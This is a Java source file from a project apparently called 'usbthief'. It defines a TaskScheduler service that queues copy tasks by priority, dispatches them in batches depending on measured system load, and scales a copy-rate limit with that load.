package com.superredrock.usbthief.worker;

import com.superredrock.usbthief.core.Service;
import com.superredrock.usbthief.core.ServiceManager;
import com.superredrock.usbthief.core.ServiceState;
import com.superredrock.usbthief.core.QueueManager;
import com.superredrock.usbthief.core.config.ConfigManager;
import com.superredrock.usbthief.core.config.ConfigSchema;
import java.util.ArrayList;
import java.util.List;
import java.util.PriorityQueue;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Future;
import java.util.concurrent.RejectedExecutionException;
import java.util.logging.Level;
import java.util.logging.Logger;

public class TaskScheduler extends Service {
    private static final Logger logger = Logger.getLogger(TaskScheduler.class.getName());

    private final PriorityQueue<PriorityTask<?, ?>> priorityQueue;
    private final LoadEvaluator loadEvaluator;
    private final ExecutorService executor;
    private final PriorityRule priorityRule;
    private volatile boolean accumulating = false;

    public TaskScheduler() {
        this.priorityQueue = new PriorityQueue<>();
        this.loadEvaluator = new LoadEvaluator();
        this.executor = QueueManager.getCopyExecutor();
        this.priorityRule = new PriorityRule();
    }

    public static TaskScheduler getInstance() {
        return ServiceManager.getInstance()
            .findService(TaskScheduler.class)
            .orElseThrow(() -> new IllegalStateException("TaskScheduler not found in ServiceManager"));
    }

    public PriorityRule getPriorityRule() {
        return priorityRule;
    }

    @Override
    protected void tick() {
        if (getServiceState() != ServiceState.RUNNING) {
            return;
        }

        LoadScore score = loadEvaluator.evaluateLoad();

        switch (score.level()) {
            case HIGH -> handleHighLoad();
            case MEDIUM -> dispatchBatch(50);
            case LOW -> dispatchAll();
            default -> dispatchBatch(100);
        }

        adjustRateLimit(score.level());
    }

    @Override
    protected long getTickIntervalMs() {
        return 500;
    }

    @Override
    public String getServiceName() {
        return "TaskScheduler";
    }

    @Override
    public String getDescription() {
        return "Adaptive priority scheduler with load-based task accumulation";
    }

    public <R> PriorityTask<Callable<R>, R> submit(Callable<R> task) {
        ServiceState state = getServiceState();
        if (state == ServiceState.STOPPED || state == ServiceState.FAILED) {
            return null;
        }

        int priority = priorityRule.calculatePriority(task);
        PriorityTask<Callable<R>, R> priorityTask = new PriorityTask<>(task, priority);

        synchronized (priorityQueue) {
            priorityQueue.offer(priorityTask);
        }

        return priorityTask;
    }

    private void handleHighLoad() {
        if (!accumulating) {
            accumulating = true;
            int queueDepth = getQueueDepth();
            logger.warning("High load detected - entering accumulation mode, queue depth: " + queueDepth);
        }
    }

    private void dispatchBatch(int batchSize) {
        if (accumulating) {
            accumulating = false;
            int queueDepth = getQueueDepth();
            logger.info("Load decreased - resuming submissions, accumulated tasks: " + queueDepth);
        }

        List<PriorityTask<?, ?>> batch = new ArrayList<>(batchSize);

        synchronized (priorityQueue) {
            for (int i = 0; i < batchSize && !priorityQueue.isEmpty(); i++) {
                batch.add(priorityQueue.poll());
            }
        }

        if (batch.isEmpty()) {
            return;
        }

        logger.fine("Dispatching batch of " + batch.size() + " tasks");

        dispatchTask(batch);
    }

    private void dispatchAll() {
        if (accumulating) {
            accumulating = false;
            int queueDepth = getQueueDepth();
            logger.info("Load decreased - resuming submissions, accumulated tasks: " + queueDepth);
        }

        List<PriorityTask<?, ?>> allTasks = new ArrayList<>();

        synchronized (priorityQueue) {
            while (!priorityQueue.isEmpty()) {
                allTasks.add(priorityQueue.poll());
            }
        }

        if (allTasks.isEmpty()) {
            return;
        }

        logger.fine("Dispatching all " + allTasks.size() + " tasks (LOW load mode)");

        dispatchTask(allTasks);
    }

    @SuppressWarnings("unchecked")
    private void dispatchTask(List<PriorityTask<?, ?>> allTasks) {
        for (PriorityTask<?, ?> task : allTasks) {
            try {
                Future<?> future = executor.submit((Callable<Object>) task.unwrap());
                task.setFuture(future);
            } catch (RejectedExecutionException e) {
                logger.warning("Task rejected during dispatch, re-queuing");
                synchronized (priorityQueue) {
                    priorityQueue.offer(task);
                }
                break;
            } catch (Exception e) {
                logger.log(Level.SEVERE, "Failed to submit task, dropping", e);
            }
        }
    }

    public synchronized int getQueueDepth() {
        return priorityQueue.size();
    }

    private void adjustRateLimit(LoadLevel level) {
        ConfigManager config = ConfigManager.getInstance();

        boolean enabled = config.get(ConfigSchema.RATE_LIMITER_LOAD_ADJUSTMENT_ENABLED);
        if (!enabled) {
            return;
        }

        long baseLimit = config.get(ConfigSchema.COPY_RATE_LIMIT_BASE);

        if (baseLimit <= 0) {
            return;
        }

        int multiplierPercent = switch (level) {
            case LOW -> 100;
            case MEDIUM -> config.get(ConfigSchema.RATE_LIMITER_MEDIUM_MULTIPLIER);
            case HIGH -> config.get(ConfigSchema.RATE_LIMITER_HIGH_MULTIPLIER);
        };

        long newLimit = baseLimit * multiplierPercent / 100;
        long currentLimit = config.get(ConfigSchema.COPY_RATE_LIMIT);

        if (newLimit < currentLimit || currentLimit <= 0) {
            config.set(ConfigSchema.COPY_RATE_LIMIT, newLimit);
            logger.fine("Adjusted rate limit to " + (newLimit / 1024 / 1024) +
                       " MB/s based on " + level + " load");
        }
    }

    @Override
    protected void cleanup() {
        logger.info("Cleaning up TaskScheduler...");

        int drained = 0;
        synchronized (priorityQueue) {
            while (!priorityQueue.isEmpty()) {
                PriorityTask<?, ?> task = priorityQueue.poll();
                if (task != null) {
                    try {
                        executor.submit(task.unwrap());
                        drained++;
                    } catch (Exception e) {
                        logger.warning("Failed to submit task during cleanup: " + e.getMessage());
                    }
                }
            }
        }

        if (drained > 0) {
            logger.info("Drained " + drained + " tasks during cleanup");
        }
    }
}
